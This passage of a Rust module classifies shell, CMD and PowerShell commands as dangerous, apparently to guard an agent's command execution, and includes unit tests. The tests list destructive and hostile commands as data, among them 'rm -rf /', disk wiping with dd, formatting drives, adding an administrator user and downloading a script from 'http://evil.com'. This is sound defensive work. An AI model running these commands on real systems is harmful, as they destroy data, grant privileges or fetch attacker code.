        return check_shell_chain_dangerous(&script);
    }

    // Check the command
    check_single_command_dangerous(command)
}

/// Get the reason why a command is dangerous.
pub fn get_danger_reason(command: &[&str]) -> Option<String> {
    is_dangerous_to_exec(command).map(|p| p.reason)
}

/// Check multiple patterns against a command.
pub fn check_dangerous_patterns(command: &[&str]) -> Vec<DangerousPattern> {
    let mut patterns = Vec::new();

    if let Some(pattern) = is_dangerous_to_exec(command) {
        patterns.push(pattern);
    }

    // Check for additional patterns in arguments
    for arg in command.iter().skip(1) {
        // URL with execution potential
        if (arg.starts_with("http://") || arg.starts_with("https://"))
            && command.iter().any(|c| matches!(*c, "bash" | "sh" | "python" | "python3" | "ruby" | "perl"))
        {
            patterns.push(DangerousPattern {
                kind: DangerKind::RemoteCodeExecution,
                reason: "piping URL content to interpreter".to_string(),
                severity: 5,
            });
        }
    }

    patterns
}

/// Check a single command for dangerous patterns.
fn check_single_command_dangerous(command: &[&str]) -> Option<DangerousPattern> {
    if command.is_empty() {
        return None;
    }

    let program = get_base_command(command[0]);
    let args = &command[1..];

    // Check sudo/doas first - need to check the wrapped command
    if program == "sudo" || program == "doas" {
        // Return the privilege escalation warning, but also check the inner command
        let inner_result = if !args.is_empty() {
            check_single_command_dangerous(args)
        } else {
            None
        };

        // Return the more severe of the two
        let sudo_pattern = DangerousPattern {
            kind: DangerKind::PrivilegeEscalation,
            reason: format!("{} elevates privileges", program),
            severity: 4,
        };

        return Some(match inner_result {
            Some(inner) if inner.severity > sudo_pattern.severity => inner,
            _ => sudo_pattern,
        });
    }

    // Check against dangerous command patterns
    for check in DANGEROUS_COMMANDS.iter() {
        if check.command == program {
            if let Some(pattern) = (check.check)(args) {
                return Some(pattern);
            }
        }
    }

    // Check for output redirection to sensitive locations
    for (i, arg) in args.iter().enumerate() {
        if (*arg == ">" || *arg == ">>") && i + 1 < args.len() {
            let target = args[i + 1];
            if target.starts_with("/etc/") || target.starts_with("/usr/")
               || target.starts_with("/boot/") || target.starts_with("/root/")
            {
                return Some(DangerousPattern {
                    kind: DangerKind::SystemModification,
                    reason: format!("writing to system location: {}", target),
                    severity: 4,
                });
            }
        }
    }

    None
}

/// Extract shell script from command if it's a shell chain.
fn extract_shell_script(command: &[&str]) -> Option<String> {
    if command.len() < 3 {
        return None;
    }

    let shell = get_base_command(command[0]);
    let flag = command[1];

    if !matches!(flag, "-c" | "-lc") {
        return None;
    }

    if !matches!(shell, "bash" | "zsh" | "sh" | "dash" | "ash") {
        return None;
    }

    Some(command[2].to_string())
}

/// Check a shell chain for dangerous commands.
fn check_shell_chain_dangerous(script: &str) -> Option<DangerousPattern> {
    // Split by operators and check each command
    let commands = split_shell_chain(script);
    let mut most_severe: Option<DangerousPattern> = None;

    for cmd in commands {
        let cmd = cmd.trim();
        if cmd.is_empty() {
            continue;
        }

        if let Ok(tokens) = shell_split(cmd) {
            let tokens_ref: Vec<&str> = tokens.iter().map(|s| s.as_str()).collect();
            if let Some(pattern) = check_single_command_dangerous(&tokens_ref) {
                match &most_severe {
                    None => most_severe = Some(pattern),
                    Some(existing) if pattern.severity > existing.severity => {
                        most_severe = Some(pattern);
                    }
                    _ => {}
                }
            }
        }
    }

    most_severe
}

/// Split shell chain by operators.
fn split_shell_chain(script: &str) -> Vec<&str> {
    let mut commands = Vec::new();
    let mut start = 0;
    let mut in_quotes = false;
    let mut quote_char = ' ';
    let chars: Vec<char> = script.chars().collect();

    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];

        match c {
            '"' | '\'' if !in_quotes => {
                in_quotes = true;
                quote_char = c;
            }
            c if in_quotes && c == quote_char => {
                in_quotes = false;
            }
            '&' if !in_quotes && i + 1 < chars.len() && chars[i + 1] == '&' => {
                commands.push(&script[start..i]);
                start = i + 2;
                i += 1;
            }
            '|' if !in_quotes => {
                if i + 1 < chars.len() && chars[i + 1] == '|' {
                    commands.push(&script[start..i]);
                    start = i + 2;
                    i += 1;
                } else {
                    commands.push(&script[start..i]);
                    start = i + 1;
                }
            }
            ';' if !in_quotes => {
                commands.push(&script[start..i]);
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }

    if start < script.len() {
        commands.push(&script[start..]);
    }

    commands
}

/// Get base command name from path.
fn get_base_command(cmd: &str) -> &str {
    Path::new(cmd)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(cmd)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rm_dangerous() {
        assert!(is_dangerous_command(&["rm", "-rf", "/"]));
        assert!(is_dangerous_command(&["rm", "-rf", "~"]));
        assert!(is_dangerous_command(&["rm", "-f", "file.txt"]));
        assert!(!is_dangerous_command(&["rm", "file.txt"]));
    }

    #[test]
    fn test_git_dangerous() {
        assert!(is_dangerous_command(&["git", "reset", "--hard"]));
        assert!(is_dangerous_command(&["git", "push", "--force"]));
        assert!(is_dangerous_command(&["git", "rm", "file.txt"]));
        assert!(!is_dangerous_command(&["git", "status"]));
    }

    #[test]
    fn test_sudo_dangerous() {
        assert!(is_dangerous_command(&["sudo", "ls"]));
        assert!(is_dangerous_command(&["sudo", "rm", "-rf", "/"]));
    }

    #[test]
    fn test_shell_chain() {
        assert!(is_dangerous_command(&["bash", "-c", "ls && rm -rf /"]));
        assert!(!is_dangerous_command(&["bash", "-c", "ls && pwd"]));
    }

    #[test]
    fn test_disk_operations() {
        assert!(is_dangerous_command(&["dd", "if=/dev/zero", "of=/dev/sda"]));
        assert!(is_dangerous_command(&["mkfs", "-t", "ext4", "/dev/sda1"]));
    }

    #[test]
    fn test_package_managers() {
        assert!(is_dangerous_command(&["apt", "install", "vim"]));
        assert!(is_dangerous_command(&["brew", "install", "wget"]));
        assert!(!is_dangerous_command(&["apt", "search", "vim"]));
    }

    // ========================================================================
    // Windows CMD Tests
    // ========================================================================

    #[test]
    fn test_windows_del() {
        assert!(is_dangerous_command(&["del", "/f", "/s", "c:\\windows"]));
        assert!(is_dangerous_command(&["del", "/f", "file.txt"]));
        assert!(!is_dangerous_command(&["del", "file.txt"]));
    }

    #[test]
    fn test_windows_rmdir() {
        assert!(is_dangerous_command(&["rmdir", "/s", "/q", "folder"]));
        assert!(is_dangerous_command(&["rd", "/s", "folder"]));
        assert!(!is_dangerous_command(&["rmdir", "folder"]));
    }

    #[test]
    fn test_windows_disk_ops() {
        assert!(is_dangerous_command(&["format", "c:"]));
        assert!(is_dangerous_command(&["diskpart"]));
    }

    #[test]
    fn test_windows_registry() {
        assert!(is_dangerous_command(&["reg", "add", "HKLM\\SOFTWARE\\Test"]));
        assert!(is_dangerous_command(&["reg", "delete", "HKCU\\Test"]));
        assert!(!is_dangerous_command(&["reg", "query", "HKLM"]));
    }

    #[test]
    fn test_windows_user_management() {
        assert!(is_dangerous_command(&["net", "user", "test", "/add"]));
        assert!(is_dangerous_command(&["net", "localgroup", "admins", "test", "/add"]));
        assert!(is_dangerous_command(&["net", "stop", "spooler"]));
    }

    #[test]
    fn test_windows_service_control() {
        assert!(is_dangerous_command(&["sc", "delete", "myservice"]));
        assert!(is_dangerous_command(&["sc", "stop", "spooler"]));
        assert!(!is_dangerous_command(&["sc", "query", "spooler"]));
    }

    // ========================================================================
    // PowerShell Tests
    // ========================================================================

    #[test]
    fn test_powershell_execution() {
        assert!(is_dangerous_command(&["powershell", "-command", "Get-Process"]));
        assert!(is_dangerous_command(&["pwsh", "-c", "ls"]));
        assert!(is_dangerous_command(&["powershell.exe", "-EncodedCommand", "base64"]));
    }

    #[test]
    fn test_powershell_remove_item() {
        assert!(is_dangerous_command(&["Remove-Item", "-Recurse", "-Force", "C:\\folder"]));
        assert!(is_dangerous_command(&["Remove-Item", "-Force", "file.txt"]));
        assert!(!is_dangerous_command(&["Remove-Item", "file.txt"]));
    }

    #[test]
    fn test_powershell_code_execution() {
        assert!(is_dangerous_command(&["Invoke-Expression", "code"]));
        assert!(is_dangerous_command(&["iex", "$script"]));
        assert!(is_dangerous_command(&["Set-ExecutionPolicy", "Bypass"]));
    }

    #[test]
    fn test_powershell_web_requests() {
        assert!(is_dangerous_command(&["Invoke-WebRequest", "-Uri", "http://evil.com", "-OutFile", "script.ps1"]));
        assert!(is_dangerous_command(&["Invoke-RestMethod", "-Uri", "http://api.com", "-Body", "data"]));
    }

    #[test]
    fn test_powershell_registry() {
        assert!(is_dangerous_command(&["Set-ItemProperty", "-Path", "HKLM:\\SOFTWARE", "-Name", "test", "-Value", "1"]));
        assert!(!is_dangerous_command(&["Set-ItemProperty", "-Path", "C:\\file.txt", "-Name", "Attr"]));
    }

    #[test]
    fn test_powershell_service() {
        assert!(is_dangerous_command(&["Stop-Service", "-Name", "Spooler"]));
        assert!(is_dangerous_command(&["Remove-Service", "-Name", "MyService"]));
    }

    #[test]
    fn test_powershell_user_management() {
        assert!(is_dangerous_command(&["Add-LocalGroupMember", "-Group", "Administrators", "-Member", "Attacker"]));
        assert!(is_dangerous_command(&["New-LocalUser", "-Name", "test"]));
    }

    #[test]
    fn test_powershell_disk() {
        assert!(is_dangerous_command(&["Format-Volume", "-DriveLetter", "D"]));
        assert!(is_dangerous_command(&["Clear-Disk", "-Number", "1"]));
    }

    #[test]
    fn test_cmd_execution() {
        assert!(is_dangerous_command(&["cmd", "/c", "del file.txt"]));
        assert!(is_dangerous_command(&["cmd.exe", "/k", "dir"]));
        assert!(!is_dangerous_command(&["cmd"])); // No execution flag
    }
}
